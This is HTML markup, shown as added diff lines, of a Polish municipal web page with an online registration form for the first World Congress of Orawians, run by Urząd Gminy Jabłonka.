+<h4 style="text-align: center;">Zgłoście Swój udział w I Światowym Zjeździe Orawian. Zapraszamy do zarejestrowania się on-line! Dzięki temu dowiemy się skąd przybywają i gdzie mieszkają obecnie Orawianie.</h4>
+<p> </p></td></tr>
+				<tr>
+					<td valign="top"  >
+						<br clear="all" />
+							<form action="index.php" method="post" id="adminForm_1" name="adminForm_1" enctype="multipart/form-data">		<div id="displayAiContactSafeForm_1">
+				<div class="aiContactSafe" id="aiContactSafe_contact_form">
+				<div class="aiContactSafe" id="aiContactSafe_info">Pola oznaczone ( * ) są wymagane.</div>
+										<div class="aiContactSafe_row" id="aiContactSafe_row_aics_name"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_name" ><label for="aics_name" >Imię i Nazwisko</label></span>&nbsp;<label class="required_field">( * )</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_name" id="aics_name"  class='textbox' value="" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_email"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_email" ><label for="aics_email" >Email</label></span>&nbsp;<label class="required_field">( * )</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_email" id="aics_email"  class='email' value="" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_phone"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_phone" ><label for="aics_phone" >Telefon</label></span>&nbsp;</div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_phone" id="aics_phone" maxlength="15" class='textbox' value="" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_subject"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_subject" ><label for="aics_subject" >Miejscowość</label></span>&nbsp;<label class="required_field">( * )</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_subject" id="aics_subject"  class='textbox' value="" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_kraj"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_kraj" ><label for="aics_kraj" >Kraj</label></span>&nbsp;<label class="required_field">( * )</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_kraj" id="aics_kraj"  class='textbox' value="" /></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_message"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_message" ><label for="aics_message" >Informacje dodatkowe</label></span>&nbsp;<label class="required_field">( * )</label></div><div class="aiContactSafe_contact_form_field_right"><textarea name="aics_message" id="aics_message" cols="40" rows="10" class='editbox' onkeydown="checkEditboxLimit(1,'aics_message', 500)" onkeyup="checkEditboxLimit(1,'aics_message',500)" onchange="checkEditboxLimit(1,'aics_message',500)"></textarea><br /><div class="countdown_div">Masz<input type="text" readonly="readonly" class="countdown_editbox" name="countdown_aics_message" id="countdown_aics_message" size="3" value="500" />pozostało znaków.</div></div>
+												</div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_send_to_sender"><div class="aiContactSafe_contact_form_field_left"><input type="checkbox" name="aics_send_to_sender" id="aics_send_to_sender" class='checkbox'  /></div><div class="aiContactSafe_contact_form_field_label_right"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_send_to_sender" ><label for="aics_send_to_sender" >Wyślij sobie kopię wiadomości</label></span>&nbsp;</div>
+												</div>
+					</div>
+					</div>
+			<br clear="all" />
+								<div id="div_captcha">
+						<div id="div_captcha_info">Wpisz kod ochronny:</div>
+						<div id="div_captcha_img"><div id="div_captcha_img_1" style="width:300px;height:55px;">...</div></div>
+						<div id="div_captcha_new">
+							<a href="javascript:void(0);" onclick="changeCaptcha(1,1);"
+								id="change-image">Nieczytelne? Zmień tekst.</a>
+						</div>
+						<div style="margin-top:5px;" id="div_captcha_code"><input type="text" name="captcha-code" id="captcha-code" /></div>
+					</div>
+								<br clear="all" />
+			<div id="aiContactSafeBtns"><div id="aiContactSafeButtons_right" style="clear:both; display:block; width:100%; text-align:right;"><div id="aiContactSafeSend" style="float:right;"><input type="submit" id="aiContactSafeSendButton" value="Wyślij!" style="float:right; margin:2px;" /><div id="aiContactSafeSend_loading_1" style="float:right; margin:2px;">&nbsp;</div></div></div></div>
+			<br clear="all" />
+		<input type="hidden" id="option" name="option" value="com_aicontactsafe" /><input type="hidden" id="sTask" name="sTask" value="message" /><input type="hidden" id="task" name="task" value="display" /><input type="hidden" id="send_mail" name="send_mail" value="1" /><input type="hidden" id="pf" name="pf" value="1" /><input type="hidden" id="return_to" name="return_to" value="" /><input type="hidden" id="current_url" name="current_url" value="http://www.zjazdorawian.pl/index.php?option=com_aicontactsafe&#38;view=message&#38;layout=message&#38;pf=1&#38;Itemid=41" /><input type="hidden" id="Itemid" name="Itemid" value="41" /><input type="hidden" id="lang" name="lang" value="" /><input type="hidden" id="back_button" name="back_button" value="0" /><input type="hidden" id="boxchecked" name="boxchecked" value="0" /><input type="hidden" id="use_ajax" name="use_ajax" value="0" /><input type="hidden" id="r_id" name="r_id" value="1312954848" /><input type="hidden" name="55802899f034c9df64bd083200759bee" value="1" /></form>						</td>
+				</tr>
+			</table>
+	</div>
+</div>
+    <!-- /article-content -->
+</div>
+<div class="cleared"></div>
+</div>
+
+		<div class="cleared"></div>
+    </div>
+</div>
+
+</div>
+
+    </div>
+</div>
+<div class="cleared"></div>
+
+<div class="art-footer">
+    <div class="art-footer-t"></div>
+    <div class="art-footer-l"></div>
+    <div class="art-footer-b"></div>
+    <div class="art-footer-r"></div>
+    <div class="art-footer-body">
+                 <div class="art-footer-text">
+      <p>Copyright &copy; 2011 Urząd Gminy Jabłonka.<br /> 
+Wszelkie prawa zastrzeżone.</p>
+
+              </div>
+        <div class="cleared"></div>
+    </div>
+</div>
+
+		<div class="cleared"></div>
+    </div>
+</div>
+<div class="cleared"></div>
+<p class="art-page-footer">Designed by <a href="http://www.agmedia.pl" target="_blank">AG media</a>.</p>
+
+
+</div>
+
+</body>
+</html>
